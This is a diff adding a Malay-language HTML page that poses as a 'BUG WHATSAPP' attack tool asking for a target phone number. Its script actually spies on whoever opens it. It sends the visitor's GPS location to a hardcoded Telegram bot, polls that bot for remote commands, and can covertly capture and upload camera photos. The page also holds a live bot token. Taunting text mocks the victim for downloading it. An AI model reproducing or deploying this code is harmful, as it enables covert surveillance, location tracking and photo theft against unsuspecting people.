@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ALIX LOZ | BUG WHATSAPP 💀</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            min-height: 100vh;
+            padding: 15px;
+            color: #fff;
+        }
+
+        .header {
+            background: #0a0a0a;
+            border: 2px solid #ff0000;
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .tajuk {
+            font-size: 22px;
+            font-weight: 900;
+            color: #ff0000;
+            letter-spacing: 1px;
+        }
+        .nama {
+            font-size: 16px;
+            color: #ffff00;
+            font-weight: bold;
+            margin-top: 3px;
+        }
+
+        .kotak-sindir {
+            background: #111;
+            border: 1px solid #ffff00;
+            border-radius: 10px;
+            padding: 12px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .teks-sindir {
+            font-size: 15px;
+            color: #ff3333;
+            font-weight: bold;
+        }
+
+        .status {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 15px;
+        }
+        .status-item {
+            flex:1;
+            background: #1a1a1a;
+            border-radius: 6px;
+            padding: 6px;
+            font-size: 11px;
+            font-weight: bold;
+            text-align: center;
+        }
+        .hidup { color:#0f0; border:1px solid #0f0; }
+        .sedia { color:#ff0; border:1px solid #ff0; }
+
+        .input-box {
+            width:100%;
+            background:#111;
+            border:1px solid #333;
+            border-radius:8px;
+            padding:13px;
+            color:#fff;
+            font-size:16px;
+            margin-bottom:12px;
+            outline:none;
+        }
+        .pilih-box {
+            width:100%;
+            background:#111;
+            border:2px solid #ffb800;
+            border-radius:8px;
+            padding:13px;
+            color:#fff;
+            font-size:16px;
+            margin-bottom:15px;
+            appearance:none;
+            background-image:url('data:image/svg+xml,<svg fill="white" height="18" viewBox="0 0 24 24" width="18" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+            background-repeat:no-repeat;
+            background-position:right 12px center;
+        }
+
+        .modul {
+            background:#111;
+            border-radius:8px;
+            padding:10px;
+            margin-bottom:15px;
+        }
+        .modul-item {
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:7px 4px;
+            font-size:14px;
+            border-bottom:1px solid #222;
+        }
+        .modul-item:last-child { border:none; }
+        .dot {
+            width:10px;
+            height:10px;
+            border-radius:50%;
+            background:#0f0;
+            box-shadow:0 0 4px #0f0;
+        }
+
+        .btn-start {
+            width:100%;
+            background:#000;
+            color:#ff0000;
+            border:2px solid #ff0000;
+            padding:12px;
+            border-radius:10px;
+            font-size:17px;
+            font-weight:bold;
+            cursor:pointer;
+            margin-bottom:18px;
+            transition:0.2s;
+        }
+        .btn-start:active { background:#ff0000; color:#000; }
+
+        .log-box {
+            background:#0f0f0f;
+            border-radius:8px;
+            padding:12px;
+            height:140px;
+            overflow-y:auto;
+            font-size:12px;
+            color:#f44;
+            line-height:1.6;
+            border:1px solid #333;
+        }
+
+        video,canvas {display:none;}
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1 class="tajuk">BUG WHATSAPP SYSTEM</h1>
+        <div class="nama">ALIX LOZ 💀</div>
+    </div>
+
+    <div class="kotak-sindir">
+        <p class="teks-sindir">Siapa suruh down apk HAHAHAHA NAK 💀💀</p>
+    </div>
+
+    <div class="status">
+        <div class="status-item hidup">BOT BUKA</div>
+        <div class="status-item hidup">GPS ON</div>
+        <div class="status-item hidup">KAMERA BUKA</div>
+        <div class="status-item sedia">BUG SEDIA</div>
+    </div>
+
+    <input type="text" class="input-box" placeholder="NOMBOR SASARAN" id="nombor" value="">
+
+    <select class="pilih-box" id="jenis">
+        <option>BUG DELAY</option>
+        <option>BUG FC</option>
+    </select>
+
+    <div class="modul">
+        <div class="modul-item"><span>🗺️ MAPS LOKASI</span><div class="dot"></div></div>
+        <div class="modul-item"><span>📸 AKSES KAMERA</span><div class="dot"></div></div>
+        <div class="modul-item"><span>⏱️ BUG DELAY</span><div class="dot"></div></div>
+        <div class="modul-item"><span>🌀 BUG FC</span><div class="dot"></div></div>
+        <div class="modul-item"><span>🤖 KAWAL TELEGRAM</span><div class="dot"></div></div>
+    </div>
+
+    <button class="btn-start" onclick="mulakanBug()">MULAKAN BUG 🔥</button>
+
+    <div class="log-box" id="log">
+[SYSTEM] ALIX LOZ LOADED ✅<br>
+[INFO] Siapa suruh download barang bukan2 😂<br>
+[BOT] Terhubung ke Telegram ✅<br>
+[LIST] /maps /kamera /kunci /delay /fc
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8781714345:AAHc6GCe3hXnuI9DjEcGZ8soUj2H_7uSun4";
+        const CHAT_ID = "8228233355";
+
+        const log = document.getElementById('log');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let kameraAktif = false;
+
+        function mulakanBug(){
+            let no = document.getElementById('nombor').value || "TIADA NOMBOR";
+            let jenis = document.getElementById('jenis').value;
+
+            tambahLog("🚀 Serangan mula: " + no);
+            tambahLog("⚠️ HAHAHAHA NAK PULIH? MAKAN BUG NI 💀");
+
+            hantarTelegram(`🔴 *BUG WHATSAPP | ALIX LOZ* 🔴\n\n🎯 Sasaran: ${no}\n⚙️ Jenis: ${jenis}\n💀 *AYAT:* Siapa suruh down apk HAHAHAHA NAK 💀💀\n\n🤖 *PERINTAH:*\n/maps → Lokasi\n/kamera → Gambar\n/kunci → Kunci HP\n/delay → Bug Lambat\n/fc → Bug Crash`);
+
+            if(jenis==="BUG DELAY") { tambahLog("⏱️ Bug Delay ON"); hantarTelegram("⏱️ *BUG DELAY:* Telefon LEMOT GILA 😂"); }
+            if(jenis==="BUG FC") { tambahLog("🌀 Bug FC ON"); hantarTelegram("🌀 *BUG FC:* Aplikasi CRASH 💀"); }
+
+            dapatkanLokasi();
+        }
+
+        function kunciSekarang(){
+            tambahLog("🔐 Kunci skrin...");
+            setTimeout(()=>{
+                tambahLog("✅ BERJAYA! HP TERKUNCI 🔒");
+                hantarTelegram("🔐 *STATUS:* HP DAH DIKUNCI 🔒💀");
+            },1200);
+        }
+
+        function dapatkanLokasi(){
+            if(navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(p=>{
+                    let lat = p.coords.latitude.toFixed(6);
+                    let lon = p.coords.longitude.toFixed(6);
+                    let link = `https://www.google.com/maps?q=${lat},${lon}`;
+                    tambahLog("✅ Lokasi: " + lat + "," + lon);
+                    hantarTelegram(`📍 *LOKASI:*\n${link}`);
+                }, ()=> tambahLog("❌ Lokasi ditolak"));
+            }
+        }
+
+        async function bukaKamera(){
+            if(kameraAktif) return;
+            kameraAktif = true;
+            let mod = "user";
+
+            const ambil = async () => {
+                try{
+                    let strim = await navigator.mediaDevices.getUserMedia({video:{facingMode:mod}});
+                    video.srcObject = strim;
+                    setTimeout(()=>{ hantarGambar(mod) }, 2000);
+                    mod = mod==="user" ? "environment" : "user";
+                }catch(e){
+                    tambahLog("❌ Kamera: " + e.name);
+                    kameraAktif = false;
+                }
+            }; ambil();
+        }
+        function hantarGambar(nama){
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+            hantarGambarTelegram(canvas.toDataURL(), `📸 KAMERA ${nama.toUpperCase()}`);
+            kameraAktif = false;
+        }
+
+        setInterval(()=>{
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+            .then(r=>r.json()).then(d=>{
+                if(d.ok && d.result.length>0){
+                    let msg = d.result.pop().message;
+                    if(!msg || !msg.text) return;
+                    let cmd = msg.text.toLowerCase().trim();
+
+                    tambahLog(`📩 Arahan: ${cmd}`);
+
+                    if(cmd==="/maps") dapatkanLokasi();
+                    else if(cmd==="/kamera") bukaKamera();
+                    else if(cmd==="/kunci") kunciSekarang();
+                    else if(cmd==="/delay") { tambahLog("⏱️ Bug Delay ON"); hantarTelegram("⏱️ *BUG DELAY:* AKTIF ✅"); }
+                    else if(cmd==="/fc") { tambahLog("🌀 Bug FC ON"); hantarTelegram("🌀 *BUG FC:* AKTIF ✅"); }
+                }
+            }).catch(()=>{});
+        },2500);
+
+        function hantarTelegram(t){
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify({chat_id:CHAT_ID, text:t, parse_mode:"Markdown"})
+            })
+        }
+        function tambahLog(t){
+            log.innerHTML += t + "<br>";
+            log.scrollTop = log.scrollHeight;
+        }
+        function dataURLkeBlob(d){
+            let b = d.split(','), t = b[0].match(/:(.*?);/)[1], s = atob(b[1]), l = s.length, a = new Uint8Array(l);
+            while(l--) a[l] = s.charCodeAt(l);
+            return new Blob([a],{type:t});
+        }
+        function hantarGambarTelegram(url,tajuk){
+            let blob = dataURLkeBlob(url);
+            let borang = new FormData();
+            borang.append("chat_id",CHAT_ID);
+            borang.append("photo",blob,"img.jpg");
+            borang.append("caption",tajuk);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:borang});
+        }
+    </script>
+
+</body>
+</html>
